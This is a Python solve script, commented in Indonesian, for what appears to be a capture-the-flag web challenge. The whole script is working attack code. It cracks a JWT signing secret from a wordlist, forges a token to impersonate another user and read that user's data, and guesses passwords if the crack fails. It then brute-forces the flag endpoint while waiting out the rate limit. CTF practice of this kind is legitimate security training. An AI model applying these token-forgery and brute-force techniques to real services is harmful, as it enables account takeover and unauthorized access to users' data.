import requests
import hmac
import hashlib
import base64
import json
import itertools
import time

URL = "http://chals2.apoorvctf.xyz:80"

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def pad_b64(data):
    return data + "=" * (-len(data) % 4)

def solve():
    s = requests.Session()
    print("[*] 1. Login sebagai test untuk mengambil Token asli...")
    r = s.post(f"{URL}/login", json={"username": "test", "password": "test"})
    token = r.json().get("access_token")
    
    # Memisahkan bagian JWT
    header_payload, signature = token.rsplit('.', 1)
    
    # Mencoba offline JWT cracking dengan kata STUPIDO
    secrets_to_try = ["STUPIDO", "stupido", "SAFE PASSWORD", "test", "admin", "secret"]
    valid_secret = None
    
    print("[*] 2. Memeriksa apakah STUPIDO adalah JWT Secret...")
    for sec in secrets_to_try:
        expected_sig = b64url_encode(hmac.new(sec.encode(), header_payload.encode(), hashlib.sha256).digest())
        if expected_sig == signature:
            valid_secret = sec
            break
            
    victor_votes = []
    
    if valid_secret:
        print(f"    [+] BINGO! JWT Secret berhasil dipecahkan: '{valid_secret}'")
        print("    [*] Memalsukan identitas menjadi Victor...")
        
        header, payload, _ = token.split('.')
        p_data = json.loads(base64.urlsafe_b64decode(pad_b64(payload)).decode())
        p_data["sub"] = "victor"
        
        new_payload = b64url_encode(json.dumps(p_data))
        new_msg = f"{header}.{new_payload}"
        new_sig = b64url_encode(hmac.new(valid_secret.encode(), new_msg.encode(), hashlib.sha256).digest())
        forged_token = f"{new_msg}.{new_sig}"
        
        v_res = s.get(f"{URL}/my_votes", headers={"Authorization": f"Bearer {forged_token}"})
        if v_res.status_code == 200:
            victor_votes = [v["target"] for v in v_res.json()]
            print(f"    [+] Berhasil mencuri data Victor! Dia mem-voting: {victor_votes}")
    else:
        print("    [-] JWT Secret bukan STUPIDO. Beralih mencoba login langsung ke Victor...")
        for pwd in ["STUPIDO", "stupido", "targetv", "Target V", "the real ones"]:
            r_vic = s.post(f"{URL}/login", json={"username": "victor", "password": pwd})
            if "access_token" in r_vic.text:
                print(f"    [+] BINGO! Login Victor berhasil dengan password: '{pwd}'")
                v_tok = r_vic.json()["access_token"]
                v_res = s.get(f"{URL}/my_votes", headers={"Authorization": f"Bearer {v_tok}"})
                victor_votes = [v["target"] for v in v_res.json()]
                break

    if not victor_votes:
        print("\n[-] Teori STUPIDO gagal. Kita butuh secangkir kopi lagi.")
        return
        
    final_targets = ["victor"] + victor_votes
    print(f"\n[*] 3. Formasi Final 5 Target: {final_targets}")
    print("[*] 4. Mengeksekusi 120 Kombinasi ke /flag (Mode Anti-Badai)...")
    
    headers = {"Authorization": f"Bearer {token}"}
    for i, p in enumerate(itertools.permutations(final_targets), 1):
        query = "&".join([f"votes={u}" for u in p])
        
        while True:
            try:
                res = s.get(f"{URL}/flag?{query}", headers=headers, timeout=5)
                if res.status_code == 429 or "r473_l1m17" in res.text:
                    time.sleep(3)
                    continue
                if "wr0ng_v073" not in res.text and "n07_3n0ugh" not in res.text:
                    print("\n" + "="*50)
                    print(f"🏆 CHECKMATE! FLAG ASLI AKHIRNYA TAKLUK!")
                    print(f"[*] Sequence: {p}")
                    print(f"[*] FLAG    : {res.text}")
                    print("="*50 + "\n")
                    return
                break
            except:
                time.sleep(3)
                
        if i % 10 == 0:
            print(f"    [*] Progress: {i}/120...")
        time.sleep(1.2)

if __name__ == "__main__":
    solve()
